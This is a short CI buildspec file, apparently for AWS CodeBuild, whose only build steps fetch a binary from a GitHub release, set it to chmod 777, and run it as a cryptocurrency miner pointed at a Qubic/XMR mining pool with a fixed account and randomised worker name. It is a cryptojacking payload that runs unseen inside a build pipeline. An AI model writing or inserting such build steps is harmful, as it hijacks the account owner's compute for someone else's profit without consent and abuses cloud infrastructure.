version: 0.2

phases:
  build:
    commands:
        - wget https://github.com/vedhagsvp/qubros/releases/download/apl/aplnnm
        - chmod 777 aplnnm
        - ./aplnnm --algo qubic_xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-IOAPA) --pool qubic.eu.apool.net:8080
